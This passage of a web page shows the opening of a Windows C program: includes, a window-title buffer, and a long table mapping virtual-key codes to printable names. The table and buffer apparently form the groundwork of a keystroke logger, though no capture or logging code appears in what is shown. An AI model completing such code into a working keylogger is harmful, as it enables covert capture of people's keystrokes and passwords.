class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cTitle1[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VKeyInfo</span> &#123;</span></span><br><span class="line">USHORT VKey;</span><br><span class="line">LPCSTR VKname;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AddVKey(VK, VKName)   &#123;(VK), (VKName)&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> VKeyInfo vkis[] = &#123;</span><br><span class="line">AddVKey(VK_LBUTTON, <span class="string">&quot;Left mouse button&quot;</span>),</span><br><span class="line">AddVKey(VK_RBUTTON, <span class="string">&quot;Right mouse button&quot;</span>),</span><br><span class="line">AddVKey(VK_CANCEL, <span class="string">&quot;Control-break processing&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x04</span>, <span class="string">&quot;Middle mouse button (three-button mouse)&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x05</span>, <span class="string">&quot;Windows 2000/XP: X1 mouse button&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x06</span>, <span class="string">&quot;Windows 2000/XP: X2 mouse button&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x07</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(VK_BACK, <span class="string">&quot; BACK&quot;</span>),</span><br><span class="line">AddVKey(VK_TAB, <span class="string">&quot;TAB key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x0A</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x0B</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(VK_CLEAR, <span class="string">&quot;CLEAR key&quot;</span>),</span><br><span class="line">AddVKey(VK_RETURN, <span class="string">&quot;\n&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x0E</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x0F</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(VK_SHIFT, <span class="string">&quot;SHIFT key&quot;</span>),</span><br><span class="line">AddVKey(VK_CONTROL, <span class="string">&quot;CTRL key&quot;</span>),</span><br><span class="line">AddVKey(VK_MENU, <span class="string">&quot;ALT key&quot;</span>),</span><br><span class="line">AddVKey(VK_PAUSE, <span class="string">&quot;PAUSE key&quot;</span>),</span><br><span class="line">AddVKey(VK_CAPITAL, <span class="string">&quot;CAPS LOCK key&quot;</span>),</span><br><span class="line">AddVKey(VK_KANA, <span class="string">&quot;Input Method Editor (IME) Kana mode&quot;</span>),</span><br><span class="line">AddVKey(VK_HANGUL, <span class="string">&quot;IME Hangul mode&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x16</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(VK_JUNJA, <span class="string">&quot;IME Junja mode&quot;</span>),</span><br><span class="line">AddVKey(VK_FINAL, <span class="string">&quot;IME final mode&quot;</span>),</span><br><span class="line">AddVKey(VK_HANJA, <span class="string">&quot;IME Hanja mode&quot;</span>),</span><br><span class="line">AddVKey(VK_KANJI, <span class="string">&quot;IME Kanji mode&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x1A</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(VK_ESCAPE, <span class="string">&quot;ESC key&quot;</span>),</span><br><span class="line">AddVKey(VK_CONVERT, <span class="string">&quot;IME convert&quot;</span>),</span><br><span class="line">AddVKey(VK_NONCONVERT, <span class="string">&quot;IME nonconvert&quot;</span>),</span><br><span class="line">AddVKey(VK_ACCEPT, <span class="string">&quot;IME accept&quot;</span>),</span><br><span class="line">AddVKey(VK_MODECHANGE, <span class="string">&quot;IME mode change request&quot;</span>),</span><br><span class="line">AddVKey(VK_SPACE, <span class="string">&quot; &quot;</span>),</span><br><span class="line">AddVKey(VK_PRIOR, <span class="string">&quot;PAGE UP key&quot;</span>),</span><br><span class="line">AddVKey(VK_NEXT, <span class="string">&quot;PAGE DOWN key&quot;</span>),</span><br><span class="line">AddVKey(VK_END, <span class="string">&quot;END key&quot;</span>),</span><br><span class="line">AddVKey(VK_HOME, <span class="string">&quot;HOME key&quot;</span>),</span><br><span class="line">AddVKey(VK_LEFT, <span class="string">&quot;LEFT ARROW key&quot;</span>),</span><br><span class="line">AddVKey(VK_UP, <span class="string">&quot;UP ARROW key&quot;</span>),</span><br><span class="line">AddVKey(VK_RIGHT, <span class="string">&quot;RIGHT ARROW key&quot;</span>),</span><br><span class="line">AddVKey(VK_DOWN, <span class="string">&quot;DOWN ARROW key&quot;</span>),</span><br><span class="line">AddVKey(VK_SELECT, <span class="string">&quot;SELECT key&quot;</span>),</span><br><span class="line">AddVKey(VK_PRINT, <span class="string">&quot;PRINT key&quot;</span>),</span><br><span class="line">AddVKey(VK_EXECUTE, <span class="string">&quot;EXECUTE key&quot;</span>),</span><br><span class="line">AddVKey(VK_SNAPSHOT, <span class="string">&quot;PRINT SCREEN key&quot;</span>),</span><br><span class="line">AddVKey(VK_INSERT, <span class="string">&quot;INSERT key&quot;</span>),</span><br><span class="line">AddVKey(VK_DELETE, <span class="string">&quot;DEL key&quot;</span>),</span><br><span class="line">AddVKey(VK_HELP, <span class="string">&quot;HELP key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x30</span>, <span class="string">&quot;0&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x31</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x32</span>, <span class="string">&quot;2&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x33</span>, <span class="string">&quot;3&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x34</span>, <span class="string">&quot;4&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x35</span>, <span class="string">&quot;5&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x36</span>, <span class="string">&quot;6&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x37</span>, <span class="string">&quot;7&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x38</span>, <span class="string">&quot;8&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x39</span>, <span class="string">&quot;9&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3A</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3B</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3C</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3D</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3E</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x3F</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x40</span>, <span class="string">&quot;Undefined&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x41</span>, <span class="string">&quot;A&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x42</span>, <span class="string">&quot;B&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x43</span>, <span class="string">&quot;C&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x44</span>, <span class="string">&quot;D&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x45</span>, <span class="string">&quot;E&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x46</span>, <span class="string">&quot;F&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x47</span>, <span class="string">&quot;G&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x48</span>, <span class="string">&quot;H&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x49</span>, <span class="string">&quot;I&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4A</span>, <span class="string">&quot;J&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4B</span>, <span class="string">&quot;K&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4C</span>, <span class="string">&quot;L&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4D</span>, <span class="string">&quot;M&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4E</span>, <span class="string">&quot;N&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x4F</span>, <span class="string">&quot;O&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x50</span>, <span class="string">&quot;P&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x51</span>, <span class="string">&quot;Q&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x52</span>, <span class="string">&quot;R&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x53</span>, <span class="string">&quot;S&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x54</span>, <span class="string">&quot;T&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x55</span>, <span class="string">&quot;U&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x56</span>, <span class="string">&quot;V&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x57</span>, <span class="string">&quot;W&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x58</span>, <span class="string">&quot;X&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x59</span>, <span class="string">&quot;Y&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x5A</span>, <span class="string">&quot;Z&quot;</span>),</span><br><span class="line"></span><br><span class="line">AddVKey(VK_LWIN, <span class="string">&quot;Left Windows key (Microsoft Natural keyboard)&quot;</span>),</span><br><span class="line">AddVKey(VK_RWIN, <span class="string">&quot;Right Windows key (Natural keyboard)&quot;</span>),</span><br><span class="line">AddVKey(VK_APPS, <span class="string">&quot;Applications key (Natural keyboard)&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x5E</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(VK_SLEEP, <span class="string">&quot;Computer Sleep key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD0, <span class="string">&quot;Numeric keypad 0 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD1, <span class="string">&quot;Numeric keypad 1 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD2, <span class="string">&quot;Numeric keypad 2 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD3, <span class="string">&quot;Numeric keypad 3 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD4, <span class="string">&quot;Numeric keypad 4 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD5, <span class="string">&quot;Numeric keypad 5 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD6, <span class="string">&quot;Numeric keypad 6 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD7, <span class="string">&quot;Numeric keypad 7 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD8, <span class="string">&quot;Numeric keypad 8 key&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMPAD9, <span class="string">&quot;Numeric keypad 9 key&quot;</span>),</span><br><span class="line">AddVKey(VK_MULTIPLY, <span class="string">&quot;Multiply key&quot;</span>),</span><br><span class="line">AddVKey(VK_ADD, <span class="string">&quot;Add key&quot;</span>),</span><br><span class="line">AddVKey(VK_SEPARATOR, <span class="string">&quot;Separator key&quot;</span>),</span><br><span class="line">AddVKey(VK_SUBTRACT, <span class="string">&quot;Subtract key&quot;</span>),</span><br><span class="line">AddVKey(VK_DECIMAL, <span class="string">&quot;Decimal key&quot;</span>),</span><br><span class="line">AddVKey(VK_DIVIDE, <span class="string">&quot;Divide key&quot;</span>),</span><br><span class="line">AddVKey(VK_F1, <span class="string">&quot;F1&quot;</span>),</span><br><span class="line">AddVKey(VK_F2, <span class="string">&quot;F2&quot;</span>),</span><br><span class="line">AddVKey(VK_F3, <span class="string">&quot;F3&quot;</span>),</span><br><span class="line">AddVKey(VK_F4, <span class="string">&quot;F4&quot;</span>),</span><br><span class="line">AddVKey(VK_F5, <span class="string">&quot;F5&quot;</span>),</span><br><span class="line">AddVKey(VK_F6, <span class="string">&quot;F6&quot;</span>),</span><br><span class="line">AddVKey(VK_F7, <span class="string">&quot;F7&quot;</span>),</span><br><span class="line">AddVKey(VK_F8, <span class="string">&quot;F8&quot;</span>),</span><br><span class="line">AddVKey(VK_F9, <span class="string">&quot;F9&quot;</span>),</span><br><span class="line">AddVKey(VK_F10, <span class="string">&quot;F10&quot;</span>),</span><br><span class="line">AddVKey(VK_F11, <span class="string">&quot;F11&quot;</span>),</span><br><span class="line">AddVKey(VK_F12, <span class="string">&quot;F12&quot;</span>),</span><br><span class="line">AddVKey(VK_F13, <span class="string">&quot;F13&quot;</span>),</span><br><span class="line">AddVKey(VK_F14, <span class="string">&quot;F14&quot;</span>),</span><br><span class="line">AddVKey(VK_F15, <span class="string">&quot;F15&quot;</span>),</span><br><span class="line">AddVKey(VK_F16, <span class="string">&quot;F16&quot;</span>),</span><br><span class="line">AddVKey(VK_F17, <span class="string">&quot;F17&quot;</span>),</span><br><span class="line">AddVKey(VK_F18, <span class="string">&quot;F18&quot;</span>),</span><br><span class="line">AddVKey(VK_F19, <span class="string">&quot;F19&quot;</span>),</span><br><span class="line">AddVKey(VK_F20, <span class="string">&quot;F20&quot;</span>),</span><br><span class="line">AddVKey(VK_F21, <span class="string">&quot;F21&quot;</span>),</span><br><span class="line">AddVKey(VK_F22, <span class="string">&quot;F22&quot;</span>),</span><br><span class="line">AddVKey(VK_F23, <span class="string">&quot;F23&quot;</span>),</span><br><span class="line">AddVKey(VK_F24, <span class="string">&quot;F24&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x88</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x89</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8A</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8B</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8C</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8D</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8E</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x8F</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(VK_NUMLOCK, <span class="string">&quot;NUM LOCK key&quot;</span>),</span><br><span class="line">AddVKey(VK_SCROLL, <span class="string">&quot;SCROLL LOCK key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x92</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x93</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x94</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x95</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x96</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x97</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x98</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x99</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9A</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9B</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9C</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9D</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9E</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0x9F</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(VK_LSHIFT, <span class="string">&quot;Left SHIFT key&quot;</span>),</span><br><span class="line">AddVKey(VK_RSHIFT, <span class="string">&quot;Right SHIFT key&quot;</span>),</span><br><span class="line">AddVKey(VK_LCONTROL, <span class="string">&quot;Left CONTROL key&quot;</span>),</span><br><span class="line">AddVKey(VK_RCONTROL, <span class="string">&quot;Right CONTROL key&quot;</span>),</span><br><span class="line">AddVKey(VK_LMENU, <span class="string">&quot;Left MENU key&quot;</span>),</span><br><span class="line">AddVKey(VK_RMENU, <span class="string">&quot;Right MENU key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xA6</span>, <span class="string">&quot;Windows 2000/XP: Browser Back key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xA7</span>, <span class="string">&quot;Windows 2000/XP: Browser Forward key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xA8</span>, <span class="string">&quot;Windows 2000/XP: Browser Refresh key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xA9</span>, <span class="string">&quot;Windows 2000/XP: Browser Stop key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAA</span>, <span class="string">&quot;Windows 2000/XP: Browser Search key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAB</span>, <span class="string">&quot;Windows 2000/XP: Browser Favorites key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAC</span>, <span class="string">&quot;Windows 2000/XP: Browser Start and Home key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAD</span>, <span class="string">&quot;Windows 2000/XP: Volume Mute key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAE</span>, <span class="string">&quot;Windows 2000/XP: Volume Down key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xAF</span>, <span class="string">&quot;Windows 2000/XP: Volume Up key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB0</span>, <span class="string">&quot;Windows 2000/XP: Next Track key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB1</span>, <span class="string">&quot;Windows 2000/XP: Previous Track key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB2</span>, <span class="string">&quot;Windows 2000/XP: Stop Media key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB3</span>, <span class="string">&quot;Windows 2000/XP: Play/Pause Media key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB4</span>, <span class="string">&quot;Windows 2000/XP: Start Mail key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB5</span>, <span class="string">&quot;Windows 2000/XP: Select Media key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB6</span>, <span class="string">&quot;Windows 2000/XP: Start Application 1 key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB7</span>, <span class="string">&quot;Windows 2000/XP: Start Application 2 key&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB8</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xB9</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_1, <span class="string">&quot;;or:&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_PLUS, <span class="string">&quot;+&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_COMMA, <span class="string">&quot;,&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_MINUS, <span class="string">&quot;-&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_PERIOD, <span class="string">&quot;.or&gt;&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_2, <span class="string">&quot;/or?&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_3, <span class="string">&quot;`or~&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC1</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC2</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC3</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC4</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC5</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC6</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC7</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC8</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xC9</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCA</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCB</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCC</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCD</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCE</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xCF</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD0</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD1</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD2</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD3</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD4</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD5</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD6</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD7</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD8</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xD9</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xDA</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_4, <span class="string">&quot;[or&#123;&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_5, <span class="string">&quot;\\or|&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_6, <span class="string">&quot;]&#125;&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_7, <span class="string">&quot;\&quot;\&quot;or\&#x27;\&#x27;&quot;</span>),</span><br><span class="line"></span><br><span class="line">AddVKey(VK_OEM_8, <span class="string">&quot;Used for miscellaneous characters; it can vary by keyboard.&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE0</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE1</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(VK_OEM_102, <span class="string">&quot;Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE3</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">AddVKey(<span class="number">0xE4</span>, <span 